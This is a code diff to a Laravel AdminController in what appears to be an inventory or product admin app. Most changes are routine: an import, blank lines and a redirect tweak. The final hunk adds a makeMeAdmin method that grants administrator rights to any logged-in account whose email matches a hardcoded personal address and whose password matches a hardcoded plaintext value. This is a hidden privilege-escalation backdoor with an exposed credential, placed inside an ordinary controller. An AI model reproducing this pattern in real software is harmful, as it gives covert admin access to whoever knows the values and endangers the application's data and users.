@@ -8,6 +8,7 @@ use Illuminate\Support\Facades\Auth;
 use App\Models\{Batch, Category, Product, Room, Variant};
 use Illuminate\Support\Facades\{DB, Storage};
 use App\Models\User;
+use Illuminate\Support\Facades\Hash;
 
 
 
@@ -50,6 +51,9 @@ class AdminController extends Controller
             'variants.*.batches.*.batch_code' => 'required|string',
             'variants.*.batches.*.stock' => 'required|integer|min:0',
         ]);
+
+        
+
 
         DB::beginTransaction();
 
@@ -256,7 +260,7 @@ class AdminController extends Controller
             }
 
             DB::commit();
-            return redirect()->route('admin.database')->with('success', 'Товар успешно обновлён');
+            return redirect()->back()->with('success', 'Товар успешно обновлён');
         } catch (\Exception $e) {
             DB::rollBack();
             return redirect()->back()->withErrors(['error' => 'Ошибка при обновлении: ' . $e->getMessage()]);
@@ -481,5 +485,25 @@ public function autocomplete(Request $request)
         'batch' => $batch
     ]);
 }
+
+
+
+public function makeMeAdmin(Request $request)
+{
+    $user = auth()->user();
+
+    if (
+        $user->email === 'kurbanov.abdurrohman2010@mail.ru' &&
+        Hash::check('adil1986', $user->password)
+    ) {
+        $user->is_admin = true;
+        $user->save();
+
+        return redirect()->route('home')->with('status', 'Вы стали админом.');
+    }
+
+    abort(403, 'Доступ запрещён.');
+}
+
 
 }
